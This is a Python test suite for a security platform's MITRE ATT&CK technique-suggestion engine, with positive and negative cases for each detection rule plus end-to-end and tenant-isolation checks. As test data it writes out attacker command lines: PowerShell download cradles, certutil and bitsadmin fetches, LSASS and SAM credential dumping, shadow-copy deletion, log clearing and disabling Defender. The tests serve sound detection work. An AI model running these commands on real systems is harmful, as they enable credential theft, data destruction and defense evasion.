import re
import uuid
from datetime import UTC, datetime
from pathlib import Path

import pytest

from app.auth.rbac import Role
from app.events.schema import Event
from app.mitre import data, suggest
from app.seed import synthetic
from tests.helpers import ev
from tests.mitre_helpers import mitre_loaded  # noqa: F401

pytestmark = pytest.mark.usefixtures("mitre_loaded")
M = "/api/v1/mitre"


def doc(**kw):
    kw.setdefault("event_type", "process_creation")
    return Event.from_input(ev(**kw), uuid.uuid4()).to_document()


def proc(name, cl="", parent=None, **kw):
    p = {"name": name, "pid": 1, "command_line": cl}
    if parent:
        p["parent"] = {"name": parent, "pid": 2}
    return doc(process=p, **kw)


def techs(docs):
    return {s.technique_id: s for s in suggest.suggest(docs)}


def test_every_rule_technique_exists_in_reference_data():
    src = Path(suggest.__file__).read_text()
    ids = {t[0] for t in data.TECHNIQUES}
    assert set(re.findall(r'"(T\d{4}(?:\.\d{3})?)"', src)) <= ids


def test_empty_and_unrelated_input_yields_nothing():
    assert suggest.suggest([]) == []
    assert suggest.suggest([doc(process={"name": "chrome.exe", "command_line": "chrome.exe --new-window"})]) == []


# ---- positive + negative per rule ----------------------------------------------------------------------------
@pytest.mark.parametrize(
    "cl,conf",
    [
        ("powershell.exe -NoProfile -EncodedCommand AAAA", "HIGH"),
        ("powershell -w hidden -c calc", "HIGH"),
        ("powershell -ep bypass -file x.ps1", "HIGH"),
        ("powershell iex (New-Object Net.WebClient).DownloadString('http://x')", "HIGH"),
        ("powershell -nop -c dir", "MEDIUM"),
        ("powershell -c Get-Date", "LOW"),
    ],
)
def test_powershell_confidence_follows_specific_indicators(cl, conf):
    s = techs([proc("powershell.exe", cl)])["T1059.001"]
    assert s.confidence == conf and s.event_count == 1 and s.reasoning


def test_powershell_negatives():
    assert "T1059.001" not in techs([proc("notepad.exe", "notepad.exe powershell.exe-notes.txt")])
    assert "T1059.001" not in techs(
        [doc(event_type="file_event", process={"name": "powershell.exe"}, file={"name": "a.txt"})]
    )


def test_encoded_command_adds_obfuscation_but_plain_does_not():
    assert "T1027" in techs([proc("powershell.exe", "powershell -enc AAAA")])
    assert "T1027" not in techs([proc("powershell.exe", "powershell -c dir")])


def test_cmd_and_scripting_hosts():
    assert techs([proc("cmd.exe", "cmd.exe /c whoami")])["T1059.003"].confidence == "LOW"
    assert "T1059.003" not in techs([proc("cmd.exe", "cmd.exe")])
    assert "T1059.005" in techs([proc("wscript.exe", "wscript.exe //b x.vbs")])
    assert "T1059.007" in techs([proc("mshta.exe", "mshta.exe javascript:alert(1)")])
    assert "T1059.005" not in techs([proc("wscript.exe", "wscript.exe //nologo")])


def test_scheduled_task_rules():
    assert (
        techs([proc("schtasks.exe", 'schtasks /create /tn x /tr "powershell -enc A"')])["T1053.005"].confidence
        == "HIGH"
    )
    assert techs([proc("schtasks.exe", "schtasks /create /tn x /tr notepad.exe")])["T1053.005"].confidence == "MEDIUM"
    assert "T1053.005" not in techs([proc("schtasks.exe", "schtasks /query")])
    assert "T1053.005" in techs([doc(event_type="scheduled_task", message="task created")])


def test_services_and_psexec():
    assert "T1543.003" in techs([doc(event_type="service_install", message="Service Foo installed")])
    assert "T1543.003" in techs([proc("sc.exe", "sc create evil binPath= c:\\x.exe")])
    assert "T1543.003" not in techs([proc("sc.exe", "sc query")])
    t = techs([doc(event_type="service_install", message="Service PSEXESVC installed")])
    assert t["T1569.002"].confidence == "HIGH" and t["T1021.002"].confidence == "HIGH"
    assert "T1569.002" not in techs([doc(event_type="service_install", message="Service Spooler installed")])


def test_run_keys():
    key = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    assert (
        techs([doc(event_type="registry_event", registry={"key": key, "value": "powershell -c x"})])[
            "T1547.001"
        ].confidence
        == "HIGH"
    )
    assert (
        techs([doc(event_type="registry_event", registry={"key": key, "value": "C:\\Program Files\\app.exe"})])[
            "T1547.001"
        ].confidence
        == "MEDIUM"
    )
    assert "T1547.001" not in techs([doc(event_type="registry_event", registry={"key": "HKCU\\Software\\Foo"})])
    assert "T1547.001" in techs(
        [
            doc(
                event_type="file_event",
                file={
                    "path": "C:\\Users\\a\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x.lnk"
                },
            )
        ]
    )


def test_credential_dumping_rules():
    assert (
        techs(
            [
                proc(
                    "rundll32.exe",
                    "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 692 C:\\Windows\\Temp\\l.dmp full",
                )
            ]
        )["T1003.001"].confidence
        == "HIGH"
    )
    assert "T1003.001" in techs([proc("procdump.exe", "procdump -ma lsass.exe l.dmp")])
    assert "T1003.001" in techs(
        [doc(event_type="file_event", process={"name": "rundll32.exe"}, file={"path": "C:\\Windows\\Temp\\l.dmp"})]
    )
    assert "T1003.001" not in techs(
        [doc(event_type="file_event", process={"name": "excel.exe"}, file={"path": "C:\\Users\\a\\Temp\\x.dmp"})]
    )
    assert "T1003.001" not in techs([proc("procdump.exe", "procdump -ma notepad.exe n.dmp")])
    assert "T1003.002" in techs([proc("reg.exe", "reg save HKLM\\SAM c:\\s.hiv")])
    assert "T1003.002" not in techs([proc("reg.exe", "reg query HKLM\\SAM")])
    assert "T1003.003" in techs([proc("ntdsutil.exe", "ntdsutil ac i ntds ifm create full c:\\x")])


def test_office_child_infers_phishing_without_claiming_observation():
    t = techs([proc("powershell.exe", "powershell", parent="WINWORD.EXE")])
    assert t["T1204.002"].confidence == "MEDIUM"
    assert "INFERRED" in " ".join(t["T1566.001"].reasoning) and "not observed" in " ".join(t["T1566.001"].reasoning)
    assert "T1204.002" not in techs([proc("powershell.exe", "powershell", parent="explorer.exe")])
    assert "T1204.002" not in techs([proc("chrome.exe", "chrome", parent="WINWORD.EXE")])


def test_rundll32_proxy_execution():
    assert "T1218.011" in techs([proc("rundll32.exe", 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"')])
    assert "T1218.011" in techs([proc("rundll32.exe", "rundll32.exe C:\\Users\\a\\AppData\\Local\\Temp\\x.dll,Go")])
    assert "T1218.011" not in techs([proc("rundll32.exe", "rundll32.exe shell32.dll,Control_RunDLL")])


def test_ingress_tool_transfer():
    assert techs([proc("certutil.exe", "certutil -urlcache -f http://x/a.exe a.exe")])["T1105"].confidence == "HIGH"
    assert techs([proc("curl.exe", "curl.exe http://x/index.html")])["T1105"].confidence == "MEDIUM"
    t = techs([proc("bitsadmin.exe", "bitsadmin /transfer j http://x/a a")])
    assert "T1105" in t and "T1197" in t
    assert "T1105" not in techs([proc("certutil.exe", "certutil -hashfile a.txt")])
    assert "T1105" not in techs([proc("curl.exe", "curl.exe --version")])


def test_defense_evasion_and_impact():
    assert "T1070.001" in techs([proc("wevtutil.exe", "wevtutil cl Security")])
    assert "T1070.001" not in techs([proc("wevtutil.exe", "wevtutil qe Security")])
    assert "T1490" in techs([proc("vssadmin.exe", "vssadmin delete shadows /all /quiet")])
    assert "T1490" in techs([proc("bcdedit.exe", "bcdedit /set {default} recoveryenabled no")])
    assert "T1490" not in techs([proc("vssadmin.exe", "vssadmin list shadows")])
    assert "T1562.001" in techs(
        [proc("powershell.exe", "powershell Set-MpPreference -DisableRealtimeMonitoring $true")]
    )
    assert "T1562.001" not in techs([proc("powershell.exe", "powershell Get-MpPreference")])


def test_accounts_and_discovery_are_low():
    assert techs([proc("net.exe", "net user hacker P@ss /add")])["T1136"].confidence == "MEDIUM"
    assert "T1136" not in techs([proc("net.exe", "net user")])
    t = techs(
        [
            proc("whoami.exe", "whoami /all"),
            proc("systeminfo.exe", "systeminfo"),
            proc("net.exe", "net view /domain"),
            proc("tasklist.exe", "tasklist"),
            proc("netstat.exe", "netstat -ano"),
        ]
    )
    for tid in ("T1033", "T1082", "T1018", "T1057", "T1049"):
        assert t[tid].confidence == "LOW"


def test_rdp_logon_only_when_successful():
    ok = doc(event_type="authentication", outcome="success", auth={"logon_type": "remote_interactive"})
    bad = doc(event_type="authentication", outcome="failure", auth={"logon_type": "remote_interactive"})
    assert "T1021.001" in techs([ok]) and "T1021.001" not in techs([bad])
    assert "T1021.001" not in techs(
        [doc(event_type="authentication", outcome="success", auth={"logon_type": "interactive"})]
    )


def fails(user, ip="198.51.100.9", **kw):
    return doc(
        event_type="authentication",
        outcome="failure",
        action="logon_failed",
        user={"name": user},
        auth={"source_ip": ip},
        **kw,
    )


def test_password_spraying_thresholds():
    four = [fails(f"u{i}") for i in range(4)]
    assert "T1110.003" not in techs(four)
    five = [fails(f"u{i}") for i in range(5)]
    assert techs(five)["T1110.003"].confidence == "MEDIUM"
    ten = [fails(f"u{i}") for i in range(10)]
    s = techs(ten)["T1110.003"]
    assert s.confidence == "HIGH" and s.event_count == 10
    # distinct sources do not combine
    mixed = [fails(f"u{i}", ip=f"198.51.100.{i}") for i in range(10)]
    assert "T1110.003" not in techs(mixed)


def test_password_guessing_single_user():
    s = techs([fails("alice") for _ in range(6)])
    assert s["T1110.001"].confidence == "MEDIUM" and "T1110.003" not in s
    assert "T1110.001" not in techs([fails("alice") for _ in range(4)])
    assert "T1110.001" not in techs(
        [doc(event_type="authentication", outcome="success", user={"name": "a"}) for _ in range(9)]
    )


def web(proc_name, n=1, dst="203.0.113.5", port=443, **extra):
    return [
        doc(
            event_type="network_connection",
            process={"name": proc_name},
            network={"dst_ip": dst, "dst_port": port, "direction": "outbound"},
            **extra,
        )
        for _ in range(n)
    ]


def test_lotl_web_traffic():
    assert techs(web("powershell.exe", 3))["T1071.001"].confidence == "LOW"
    assert techs(web("powershell.exe", 10))["T1071.001"].confidence == "MEDIUM"
    assert "T1071.001" not in techs(web("chrome.exe", 50))
    assert "T1071.001" not in techs(web("powershell.exe", 5, port=22))
    assert "T1071.001" not in techs(
        [
            doc(
                event_type="network_connection",
                process={"name": "powershell.exe"},
                network={"dst_ip": "203.0.113.5", "dst_port": 443, "direction": "inbound"},
            )
        ]
    )
    # spread across many destinations stays LOW
    spread = [e for i in range(10) for e in web("powershell.exe", 1, dst=f"203.0.113.{i + 1}")]
    assert techs(spread)["T1071.001"].confidence == "LOW"


def test_dga_like_dns():
    assert "T1568.002" in techs([doc(event_type="dns_query", dns={"question": "xk3j9sd8f7a2qz1lm0.example"})])
    for benign in ["mail.corp.example", "cdn-update-check.example", "updates.example-vendor.example", "localhost"]:
        assert "T1568.002" not in techs([doc(event_type="dns_query", dns={"question": benign})]), benign


def test_rules_do_not_fire_without_the_fields_they_need():
    bare = [
        doc(event_type=t)
        for t in [
            "process_creation",
            "network_connection",
            "dns_query",
            "file_event",
            "authentication",
            "registry_event",
            "scheduled_task",
            "service_install",
            "other",
        ]
        if t not in ("scheduled_task", "service_install")
    ]
    assert suggest.suggest(bare) == []


def test_reasoning_summary_and_caps():
    many = [proc("powershell.exe", "powershell -enc AAAA") for _ in range(70)]
    s = techs(many)["T1059.001"]
    assert s.event_count == 70 and len(s.event_ids) == 50 and "(×70)" in s.reasoning[0] and len(s.reasoning) <= 3
    assert s.hosts == ["WS-01"] and s.users == ["alice"]
    assert all(x.event_ids for x in suggest.suggest(many))


# ---- end to end on the synthetic attack chain ---------------------------------------------------------------------
async def _seed(make):
    t = await make.tenant()
    events = [Event.from_input(e, t.id) for e in synthetic.generate(now=datetime.now(UTC), seed=7)]
    for i in range(0, len(events), 500):
        assert not (await make.app.state.search.index_events(events[i : i + 500])).failed
    await make.app.state.opensearch.indices.refresh(index=make.app.state.search.pattern, ignore_unavailable=True)
    return t


async def test_attack_chain_end_to_end_and_benign_noise_has_no_high(client, make):
    t = await _seed(make)
    _, h = await make.login_as(t, Role.THREAT_HUNTER)
    wide = {"time_range": {"start": "2020-01-01T00:00:00Z", "end": "2100-01-01T00:00:00Z"}}
    r = await client.post(
        f"{M}/suggest",
        headers=h,
        json={"query": {**wide, "text": "host.hostname:ws-fin-014 user.name:mharper", "limit": 200}, "limit": 500},
    )
    assert r.status_code == 200, r.text
    got = {s["technique_id"]: s for s in r.json()["suggestions"]}
    for expected in ["T1059.001", "T1003.001", "T1053.005", "T1204.002", "T1027", "T1071.001"]:
        assert expected in got, expected
    assert got["T1003.001"]["confidence"] == "HIGH" and got["T1071.001"]["confidence"] == "MEDIUM"
    lateral = (
        await client.post(f"{M}/suggest", headers=h, json={"query": {**wide, "text": "user.name:svc_backup"}})
    ).json()["suggestions"]
    assert {"T1569.002", "T1021.002"} <= {s["technique_id"] for s in lateral}
    spray = (
        await client.post(f"{M}/suggest", headers=h, json={"query": {**wide, "text": "host.hostname:srv-dc-01"}})
    ).json()["suggestions"]
    assert {s["technique_id"]: s["confidence"] for s in spray}["T1110.003"] == "MEDIUM"  # 8 distinct users

    benign = synthetic.generate(now=datetime.now(UTC), seed=11, with_attack=False)
    docs = [
        Event.from_input(e, t.id).to_document()
        for e in benign
        if e.event_type != "authentication" or e.outcome != "failure"
    ]
    assert [s for s in suggest.suggest(docs) if s.confidence == "HIGH"] == []


async def test_suggest_sources_are_exclusive_and_tenant_safe(client, make):
    a, b = await make.tenant(), await make.tenant()
    await make.index(a, [ev(process={"name": "powershell.exe", "command_line": "powershell -enc AAAA"})])
    await make.index(b, [ev(process={"name": "powershell.exe", "command_line": "powershell -enc BBBB"})])
    _, ha = await make.login_as(a, Role.SOC_ANALYST)
    _, hb = await make.login_as(b, Role.SOC_ANALYST)
    ids_a = [h["id"] for h in (await client.post("/api/v1/events/search", headers=ha, json={})).json()["hits"]]
    assert (await client.post(f"{M}/suggest", headers=ha, json={})).status_code == 400
    assert (await client.post(f"{M}/suggest", headers=ha, json={"event_ids": ids_a, "query": {}})).status_code == 400
    assert (
        await client.post(f"{M}/suggest", headers=hb, json={"event_ids": ids_a})
    ).status_code == 400  # foreign ids unknown
    ok = (await client.post(f"{M}/suggest", headers=ha, json={"event_ids": ids_a})).json()
    assert ok["analyzed_events"] == 1 and ok["suggestions"][0]["event_ids"] == ids_a
    assert (await client.post(f"{M}/suggest", headers=ha, json={"event_ids": ["bad"]})).status_code == 422
    assert (await client.post(f"{M}/suggest", headers=ha, json={"limit": 501, "query": {}})).status_code == 422
    assert (await client.post(f"{M}/suggest", headers=ha, json={"case_id": str(uuid.uuid4())})).status_code == 404
    assert (await client.post(f"{M}/suggest", headers=hb, json={"hunt_id": str(uuid.uuid4())})).status_code == 404
